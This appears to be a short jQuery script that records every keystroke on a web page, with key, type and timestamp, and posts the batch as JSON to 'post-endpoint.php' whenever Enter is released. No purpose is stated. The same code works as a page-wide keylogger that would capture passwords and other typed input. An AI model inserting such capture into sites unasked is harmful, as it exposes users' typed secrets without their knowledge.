var EventBuffer = [];
var last_event = null;

function sendEvents(pending) {
    $.post("post-endpoint.php", {data: JSON.stringify(pending)});
}

function StreamEvent(event) {
    var ev = {
        timestamp: event.timeStamp,
        key: event.key,
        type: event.type,
    };

    if (event.key == 'Enter') {
        if (event.type == 'keyup') {
            Pending = EventBuffer;
            EventBuffer = [];
            sendEvents(Pending);
        }
    }
    else
    {
        EventBuffer.push(ev);
    }



    last_event = event;
}

$(document).keydown(StreamEvent);
$(document).keyup(StreamEvent);

